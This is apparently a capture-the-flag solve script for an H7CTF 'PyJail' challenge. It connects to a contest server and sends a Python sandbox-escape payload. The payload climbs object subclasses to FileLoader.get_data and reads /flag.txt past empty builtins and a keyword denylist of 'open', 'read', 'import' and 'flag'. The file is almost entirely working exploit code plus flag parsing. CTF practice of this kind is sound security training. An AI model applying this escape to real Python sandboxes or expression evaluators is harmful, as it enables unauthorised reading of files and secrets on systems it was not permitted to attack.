#!/usr/bin/env python3
"""
Sandboxed - PyJail Expression Evaluator Bypass
Bypasses empty builtins and banned keyword denylist using FileLoader.get_data().
"""

import os
import re
import sys

# Ensure tools directory is accessible for scope enforcement
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(PROJECT_ROOT, "tools"))
from scope_guard import safe_connect

HOST = "pwn.h7tex.com"
PORT = 43225

def solve():
    s = safe_connect(HOST, PORT)
    banner = s.recv(1024).decode()
    print("[*] Banner received:")
    print(banner.strip())

    # Payload:
    # 1. Access object subclasses via ().__class__.__mro__[1].__subclasses__()
    # 2. Select FileLoader (from _frozen_importlib_external) whose name contains no banned words
    # 3. Call get_data(None, '/fl' + 'ag.txt') without using banned 'open', 'read', 'import', or 'flag'
    payload = "[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'FileLoader'][0].get_data(None, '/fl' + 'ag.txt')\n"
    print(f"[*] Sending payload ({len(payload)} bytes): {payload.strip()}")
    s.sendall(payload.encode())

    response = s.recv(4096).decode().strip()
    s.close()
    print(f"[*] Raw Response: {response}")

    match = re.search(r"H7CTF\{[a-f0-9\-]+\}", response)
    if match:
        flag = match.group(0)
        print(f"[+] Flag found: {flag}")
        return flag
    else:
        print("[-] Flag not matched in response.")
        return response

if __name__ == "__main__":
    solve()
